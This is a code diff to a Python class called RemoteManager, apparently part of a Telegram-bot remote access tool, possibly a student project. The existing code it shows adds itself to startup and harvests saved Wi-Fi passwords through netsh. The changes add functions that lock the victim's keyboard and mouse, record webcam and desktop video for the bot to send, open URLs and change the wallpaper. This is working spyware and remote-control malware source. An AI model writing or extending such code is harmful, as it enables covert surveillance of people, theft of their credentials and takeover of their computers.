@@ -1,17 +1,26 @@
+import ctypes
 import getpass
 import io
 import os
 import subprocess
+import threading
 import time
-
 import cv2
+import keyboard
+import numpy as np
+import pyautogui
 import pyttsx3
+import webbrowser
+
+from aiogram import types
+from pynput.mouse import Controller
 
 
 class RemoteManager:
     def __init__(self, bot):
         self.bot = bot
         self.USER_NAME = getpass.getuser()
+        self.width, self.height = pyautogui.size()
 
     def add_to_startup(self, file_path=""):
         if file_path == "":
@@ -45,6 +54,9 @@ class RemoteManager:
             res += new_string
 
         return res
+
+    def open_url(self, url="https://www.youtube.com/watch?v=dQw4w9WgXcQ"):
+        webbrowser.open(url, new=1)
 
     def get_passwords(self):
         wifi_list = self.execute_command_console("netsh wlan show profiles")
@@ -90,6 +102,27 @@ class RemoteManager:
         engine.say(text)
         engine.runAndWait()
 
+    def blockinput(self):
+        global block_input_flag
+        block_input_flag = 1
+        t1 = threading.Thread(target=self.blockinput_start)
+        t1.start()
+        print("[SUCCESS] Input blocked!")
+
+    def blockinput_stop(self):
+        global block_input_flag
+        for i in range(150):
+            keyboard.unblock_key(i)
+        block_input_flag = 0
+
+    def blockinput_start(self):
+        mouse = Controller()
+        global block_input_flag
+        for i in range(150):
+            keyboard.block_key(i)
+        while block_input_flag == 1:
+            mouse.position = (0, 0)
+
     def make_cam_photo(self):
         cap = cv2.VideoCapture(0)
 
@@ -105,26 +138,53 @@ class RemoteManager:
         cap.release()
         cv2.destroyAllWindows()
 
-    async def make_cam_video(self):
+    def make_cam_video(self):
         cap = cv2.VideoCapture(0)
-        fps = 20.0
-        image_size = (640, 480)
-        video_file = 'res.mp4'
 
-        # Check if the webcam is opened correctly
-        if not cap.isOpened():
-            raise IOError("Cannot open webcam")
+        cap.set(cv2.CAP_PROP_FPS, 20)
+        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
+        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
 
-        out = cv2.VideoWriter(video_file, cv2.VideoWriter_fourcc(*'MJPG'), fps, image_size)
+        codec = cv2.VideoWriter_fourcc(*'MJPG')
+        out = cv2.VideoWriter('webvideo.avi', codec, 20, (640, 480))
 
-        i = 0
+        frames = 0
         while True:
             ret, frame = cap.read()
             out.write(frame)
-            time.sleep(0.05)
-            i = i + 1
-            if i > 100:
+
+            time.sleep(0.01)
+            frames += 1
+            if frames > 300:
                 break
 
+        out.release()
         cap.release()
         cv2.destroyAllWindows()
+
+        return types.InputFile(path_or_bytesio='webvideo.avi')
+
+    def make_desktop_video(self):
+        codec = cv2.VideoWriter_fourcc(*'MJPG')
+        out = cv2.VideoWriter('webvideo.avi', codec, 20, (640, 480))
+
+        frames = 0
+        while True:
+
+            image = pyautogui.screenshot(region=(0, 0, self.width, self.height))
+            frame = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR)
+            out.write(frame)
+
+            time.sleep(0.01)
+            frames += 1
+            if frames > 300:
+                break
+
+        out.release()
+        cv2.destroyAllWindows()
+
+        return types.InputFile(path_or_bytesio='webvideo.avi')
+
+    def change_background(self, path='D:\\kursach_telegram\\img_1.png'):
+        SPI_SETDESKWALLPAPER = 20
+        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 3)
